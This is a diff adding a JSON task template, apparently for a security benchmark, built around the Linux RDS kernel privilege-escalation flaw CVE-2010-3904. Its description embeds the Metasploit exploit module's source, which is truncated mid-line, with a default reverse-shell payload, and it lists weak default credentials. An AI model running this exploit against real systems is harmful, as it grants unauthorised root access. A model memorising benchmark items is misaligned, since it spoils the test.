@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44677",
+  "category": "",
+  "attack_technique": "",
+  "cwe": "",
+  "description": "Linux privilege escalation: Linux 2.6.30 < 2.6.36-rc8 - Reliable Datagram Sockets (RDS) Privilege Escalation (Metasploit) (CVE-2010-3904)\n\nExploit source code (44677.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Reliable Datagram Sockets (RDS) Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a vulnerability in the rds_page_copy_user function\n        in net/rds/page.c (RDS) in Linux kernel versions 2.6.30 to 2.6.36-rc8\n        to execute code as root (CVE-2010-3904).\n\n        This module has been tested successfully on Fedora 13 (i686) with\n        kernel version 2.6.33.3-85.fc13.i686.PAE and Ubuntu 10.04 (x86_64)\n        with kernel version 2.6.32-21-generic.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Dan Rosenberg', # Discovery and C exploit\n          'Brendan Coles'  # Metasploit\n        ],\n      'DisclosureDate' => 'Oct 20 2010',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'AKA', 'rds-fail.c' ],\n          [ 'EDB', '15285' ],\n          [ 'CVE', '2010-3904' ],\n          [ 'BID', '44219' ],\n          [ 'URL', 'https://securitytracker.com/id?1024613' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=799c10559d60f159ab2232203f222f18fa3c4a5f' ],\n          [ 'URL', 'http://vulnfactory.org/exploits/rds-fail.c' ],\n          [ 'URL', 'http://web.archive.org/web/20101020044047/http://www.vsecurity.com/resources/advisory/20101019-1/' ],\n          [ 'URL', 'http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'PAYLOAD'     => 'linux/x86/meterpreter/reverse_tcp',\n          'WfsDelay'    => 10,\n          'PrependFork' => true\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ]),\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def modules_disabled?\n    modules_disabled = cmd_exec('cat /proc/sys/kernel/modules_disabled').to_s.strip\n    (modules_disabled.eql?('1') || modules_disabled.eql?('2'))\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, da\n```",
+  "cve": "CVE-2010-3904",
+  "exploitdb_id": "44677",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44677",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
